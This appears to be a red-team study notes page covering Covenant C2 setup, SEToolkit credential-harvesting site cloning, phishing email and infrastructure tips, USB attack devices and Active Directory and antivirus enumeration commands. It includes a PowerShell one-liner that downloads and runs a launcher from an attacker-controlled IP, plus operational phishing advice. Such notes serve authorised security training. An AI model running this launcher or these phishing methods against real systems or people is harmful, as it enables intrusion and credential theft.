# Red Teaming / C2



## Covenant


```sh
# INSTALLATION
The easiest way to use Covenant is by installing dotnet core. You can download dotnet core for your platform from here.
https://dotnet.microsoft.com/download/dotnet-core/3.1
Be sure to install the dotnet core version 3.1 SDK!
$ ~ > git clone --recurse-submodules https://github.com/cobbr/Covenant
$ ~ > cd Covenant/Covenant
$ ~/Covenant/Covenant > dotnet run

# REGISTER A NEW USER

# LISTENERS
Listeners (on the left menu) > Create
Choose the same BindPort and ConnectPort # (80 or 9999 for example)
ConnectAddresses has to be our attacking IP

# LAUNCHERS
Launchers menu (on the left) > Select PowerShell
Verify the default settings and click on Generate
Click on the Host tab and enter /shell.ps1 on Url field, which will be the path to the served launcher.
Then click on Host button so Launcher will show ..../shell.ps1 as part of the DownloadString command on Launcher field
Finally we execute that launcher command on the target (CMD/PS shell) # use port 9999 or just port 80 
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.8:9999/shell.ps1')
After that, we should get a notification "grunt X has been activated"


# GRUNTS

## Havoc

## Phishing

### Social Engineering Toolkit


```bash
https://github.com/trustedsec/social-engineer-toolkit

We can use the Social Engineer Toolkit to set up a fake website and phish the users. 
SEToolkit supports cloning pages and capturing incoming credentials. 
Run setoolkit and select the options Social-Engineering Attacks > Website Attack Vectors > Credential Harvester Attack > Site Cloner . Next, enter your VPN IP address (e.g. 10.10.14.X) for incoming requests, followed by the login page URL:

https://humongousretail.com/remote/auth/login.aspx

# Then we can send emails using swaks
```


### Convincing Phishing Emails

* Sender address from a significant brand, contact or cowoker. Use OSINT to suit it better to the destinatary.
* Subject: urgent, worrying, piques the victim's curiosity (account compromised, package shipped, payroll info, leaked pics...
* Content/Body: mimic standard email templates of the company, signatures, use anchor text \<a href> to disguise links

### Phishing Infrastructure

* Domain Name (buy expired domains, typosquatting, TLD alternative such as .co.uk, IDN Homograph Attack/Script Spoofing)
* SSL/TLS certificates
* Email Server/Account
* DNS Records to improve deliverability (not getting into spam folder)
* Web Server
* Analytics of emails sent, opened...

Droppers > software to be downloaded and run (legitimate but once installed, the intended malware is either unpacked or downloaded)

Use MS Office in Phishing as attachments with macros

Browser exploits: difficult, but might work if we know systems and are old or unpatched for sth like [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)

## DELIVERY TECHNIQUES

### Mail

The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.

The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.

Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others.

### Web

[https://attack.mitre.org/techniques/T1189/](https://attack.mitre.org/techniques/T1189/)

Web server with reputation of its domain name and TLS (Transport Layer Security) certificate.

### USB

[https://attack.mitre.org/techniques/T1091/](https://attack.mitre.org/techniques/T1091/)

Useful at conferences or events where the adversary can distribute the USB.

Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), chargingĀ USB cable, such asĀ [O.MG Cable](https://shop.hak5.org/products/omg-cable).

## Initial Access

### Network Infrastructure

Internal network with VLAN for example

A DMZ Network is an edge network that protects and adds an extra security layer to a corporation's internal local-area network from untrusted traffic. A common design for DMZ is a subnetwork that sits between the public internet and internal networks.

### AD

```
systeminfo | findstr Domain
 Get-ADUser  -Filter *
 Get-ADUser -Filter * -SearchBase "CN=Users,DC=DOMAIN,DC=COM"
```

### AV

```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

### Security Event Logging and Monitoring


```bash
Get-EventLog -List
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
